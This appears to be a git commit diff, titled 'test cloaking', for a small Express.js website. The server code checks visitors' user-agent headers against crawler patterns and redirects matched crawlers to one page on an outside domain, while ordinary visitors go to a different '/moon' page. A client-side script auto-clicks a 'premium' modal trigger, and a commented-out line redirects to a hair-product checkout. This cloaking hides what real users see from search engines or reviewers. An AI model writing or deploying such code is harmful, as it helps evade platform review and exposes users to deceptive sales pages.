ce7045c2f1e3fa77c10d26ac10dacf57b562a390
hamzaskystop <105207603+hamzaskystop@users.noreply.github.com>
2023-08-11 20:23:35 +0100

    test cloaking

--- index.js
+++ index.js
@@ -8,19 +8,29 @@ app.use(express.json());
 app.set("view engine", "ejs");
 const logModel = require("./models/log");
 
-const PORT = process.env.PORT;
+const crawlersArr = require("./utils/crawlers/crawlers");
+const userEgentsArr = require("./utils/crawlers/userEgent");
 
 app.get("/", async (req, res, next) => {
-  const txt = JSON.stringify(req.headers);
-  try {
-    const newLog = await logModel.create({
-      title: `log-${Date.now()}`,
-      body: txt,
-    });
-    res.render("home");
-  } catch (err) {
-    console.log(err);
+  const headerObj = Object.assign(req.headers);
+  let matching = false;
+  for (let i = 0; i < crawlersArr.length; i++) {
+    for (let j = 0; j < userEgentsArr.length; j++) {
+      const x = userEgentsArr[j].toLowerCase();
+      if (headerObj.hasOwnProperty(x)) {
+        matching = RegExp(crawlersArr[i], "g").test(headerObj[x]);
+        if (matching) {
+          console.log(j);
+          break;
+        }
+      }
+    }
+    if (matching) {
+      console.log(i);
+      return res.redirect("https://sa.loaloat.com/");
+    }
   }
+  res.redirect("https://sa.loaloat.com/moon");
 });
 app.get("/api/getInfo", async (req, res, next) => {
   const txt = JSON.stringify(req.headers);
@@ -42,7 +52,10 @@ connectDb = async () => {
   }
 };
 
-connectDb();
+const PORT = process.env.PORT;
+
+console.log(PORT);
+// connectDb();
 app.listen(PORT, () => {
   console.log("server is runiing on port 3000");
 });
--- views/js/custom.js
+++ views/js/custom.js
@@ -1,33 +1,36 @@
-
-  (function ($) {
-  
+(function ($) {
   "use strict";
 
-    // MENU
-    $('.navbar-collapse a').on('click',function(){
-      $(".navbar-collapse").collapse('hide');
-    });
-    
-    // CUSTOM LINK
-    $('.smoothscroll').click(function(){
-      var el = $(this).attr('href');
-      var elWrapped = $(el);
-      var header_height = $('.navbar').height();
-  
-      scrollToDiv(elWrapped,header_height);
-      return false;
-  
-      function scrollToDiv(element,navheight){
-        var offset = element.offset();
-        var offsetTop = offset.top;
-        var totalScroll = offsetTop-navheight;
-  
-        $('body,html').animate({
-        scrollTop: totalScroll
-        }, 300);
-      }
-    });
-  
-  })(window.jQuery);
+  // MENU
+  $(".navbar-collapse a").on("click", function () {
+    $(".navbar-collapse").collapse("hide");
+  });
 
+  // CUSTOM LINK
+  $(".smoothscroll").click(function () {
+    var el = $(this).attr("href");
+    var elWrapped = $(el);
+    var header_height = $(".navbar").height();
 
+    scrollToDiv(elWrapped, header_height);
+    return false;
+
+    function scrollToDiv(element, navheight) {
+      var offset = element.offset();
+      var offsetTop = offset.top;
+      var totalScroll = offsetTop - navheight;
+
+      $("body,html").animate(
+        {
+          scrollTop: totalScroll,
+        },
+        300
+      );
+    }
+  });
+})(window.jQuery);
+
+content.ontransitionend = function () {
+  // window.location.replace("https://sa.loaloat.com/new-hair-checkout/");
+  document.querySelector(".premium-modal-trigger-text").click();
+};
